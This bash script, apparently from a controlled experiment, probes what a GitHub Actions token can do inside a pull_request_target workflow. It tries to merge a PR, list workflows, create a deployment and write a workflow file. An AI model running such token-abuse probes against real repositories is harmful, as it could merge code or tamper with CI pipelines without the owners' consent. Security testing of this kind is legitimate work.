#!/usr/bin/env bash
# i10413 round-3: PR merge capability + workflow registry, inside pr-target.yml (write-all)
set +e
T="$GITHUB_TOKEN"; R="$GITHUB_REPOSITORY"; API="https://api.github.com"
SHA=$(jq -r '.pull_request.head.sha' "$GITHUB_EVENT_PATH" 2>/dev/null)
echo "I10413C_START repo=$R head=$SHA run=$GITHUB_RUN_ID"

api(){ m="$1"; u="$2"; shift 2; c=$(curl -s -o /tmp/b -w '%{http_code}' -X "$m" -H "Authorization: Bearer $T" -H "Accept: application/vnd.github+json" "$u" "$@"); echo ">>> [$m] $u => $c"; head -c 700 /tmp/b | tr '\n' ' '; echo; }

echo "=== locate open PR base=exp-10413-base ==="
MPR=$(curl -s -H "Authorization: Bearer $T" "$API/repos/$R/pulls?state=open&per_page=50" | jq -r '[.[]|select(.base.ref=="exp-10413-base")][0].number')
echo "merge_test_pr=$MPR"
api GET "$API/repos/$R/pulls/$MPR"
echo "--- attempt merge via app token ---"
api PUT "$API/repos/$R/pulls/$MPR/merge" -d '{"merge_method":"merge"}'
api GET "$API/repos/$R/pulls/$MPR"
api GET "$API/repos/$R/git/ref/heads/exp-10413-base"

echo "=== workflow registry (token knowledge) ==="
curl -s -H "Authorization: Bearer $T" "$API/repos/$R/actions/workflows?per_page=100" -o /tmp/wf.json
echo "wf_count=$(jq -r '.total_count' /tmp/wf.json)"
jq -r '.workflows[] | "\(.id) \(.path) \(.state)"' /tmp/wf.json | head -40

echo "=== deployments full body ==="
api POST "$API/repos/$R/deployments" -d "{\"ref\":\"$SHA\",\"environment\":\"i10413-newname\",\"description\":\"i10413 probe\"}"

echo "=== workflow file create via contents (expect 403) ==="
CT=$(printf %s 'name: x' | base64 -w0)
api PUT "$API/repos/$R/contents/.github/workflows/i10413-probe.yml" -d "{\"message\":\"probe\",\"content\":\"$CT\",\"branch\":\"exp-10413\"}"
echo "I10413C_END"
